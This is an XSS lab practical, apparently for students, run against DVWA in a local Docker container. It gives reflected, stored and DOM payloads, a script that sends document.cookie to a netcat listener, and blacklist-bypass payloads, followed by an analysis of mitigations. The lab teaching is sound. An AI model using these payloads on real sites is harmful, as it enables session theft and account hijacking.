# Practical 03: Demonstration and Analysis of Cross-Site Scripting (XSS) in a Vulnerable Web Application

**Aim:** To demonstrate reflected, stored, and DOM-based Cross-Site Scripting
(XSS) against DVWA (Damn Vulnerable Web Application), and to analyze the
resulting impact (session cookie theft) and mitigations across DVWA's
security levels.

**Environment:** Kali Linux. DVWA is run from its own official Dockerfile —
this is the standard, supported way to stand up DVWA, and keeps the
vulnerable PHP/MySQL stack fully contained to one disposable container on
`127.0.0.1`. Nothing outside your machine is touched.

---

## 1. Stand up DVWA

```bash
sudo apt install -y docker.io git
sudo systemctl enable --now docker

git clone https://github.com/digininja/DVWA.git ~/pentest-lab/DVWA
cd ~/pentest-lab/DVWA
sudo docker compose build
sudo docker compose up -d
```

Open `http://127.0.0.1:4280`, go to **Setup / Reset DB**, click
**Create / Reset Database**, then log in with the default credentials:

```
Username: admin
Password: password
```

Set the difficulty via **DVWA Security** (top menu) → **Low** — start every
exercise below at Low, then repeat at Medium/High for the mitigation
comparison in Step 5.

---

## 2. Reflected XSS

Navigate to **XSS (Reflected)** and submit:

```
<script>alert(document.domain)</script>
```

The alert firing confirms the input is echoed back into the page and
executed immediately — the payload only exists in this one request/response,
visible in the URL (`?name=<script>...`).

---

## 3. Stored XSS

Navigate to **XSS (Stored)** (the guestbook) and submit a message:

```
<script>alert('stored XSS')</script>
```

Reload the page, or revisit it later/from a different browser tab — the
alert fires again on every load, with nothing in the URL this time, because
the payload is now persisted server-side in DVWA's `guestbook` table and
re-rendered to every visitor.

---

## 4. DOM-based XSS

Navigate to **XSS (DOM)**. This page picks a language via a `default`
parameter that's written into the page by client-side JavaScript, without
ever reaching the server-side rendering. Try:

```
http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
```

Note in the report that this one doesn't even need a vulnerable server:
inspect **View Source** vs the browser's **Inspect Element** (rendered DOM)
to show the payload is injected purely by client-side script reading
`location.href`, not by anything the server sent.

---

## 5. Cookie-theft demonstration

Start a listener on the same machine:

```bash
nc -lvnp 8888
```

Submit this payload into the Stored XSS guestbook:

```
<script>new Image().src='http://127.0.0.1:8888/steal?c='+encodeURIComponent(document.cookie)</script>
```

Reloading the guestbook fires an outbound request carrying the DVWA
`PHPSESSID` session cookie to the listener — visible in the `nc` terminal.
This is the same cookie-theft mechanism as Practical 04, except the delivery
vector here is injected script rather than network interception.

---

## 6. Mitigations: compare security levels

Go to **DVWA Security** → set **Medium**, then **High**, and repeat Steps 2
and 3 with the same payloads.

- **Medium**: DVWA applies a naive `str_replace("<script>", "", ...)`
  filter. Bypass it to demonstrate why blacklisting is weak:
  ```
  <scr<script>ipt>alert(1)</scr</script>ipt>
  ```
  or an event-handler payload that never contains the literal string
  `<script>`:
  ```
  <img src=x onerror=alert(1)>
  ```
- **High**: DVWA uses a regex + `htmlspecialchars()`-style output encoding.
  The same payloads should now render as inert text — this is the correct
  fix (encode on output), not the Medium-level input blacklist.

---

## 7. What to put in your lab report

1. Screenshots of the reflected, stored, and DOM alert boxes firing at Low
   security, each with the payload/URL visible.
2. The `nc` listener output showing the exfiltrated `PHPSESSID`.
3. The Medium-level filter bypass (payload + alert firing despite the
   filter) and the High-level attempt being neutralized (payload rendered
   as literal text).
4. **Analysis**: reflected vs stored vs DOM XSS — where the payload lives
   (request/response vs database vs client-side only), who's affected (one
   victim per crafted link vs every visitor vs only victims who follow a
   crafted URL/fragment), and why DVWA's Medium-level blacklist is bypassable
   while High-level output encoding isn't (filtering input patterns vs
   encoding output by context).
5. **Mitigations** (beyond DVWA's own High level): Content-Security-Policy,
   `HttpOnly` cookies (would have blocked Step 5 even with the XSS present),
   and templating engines that auto-escape by default.

---

## 8. Cleanup

```bash
cd ~/pentest-lab/DVWA
sudo docker compose down
```
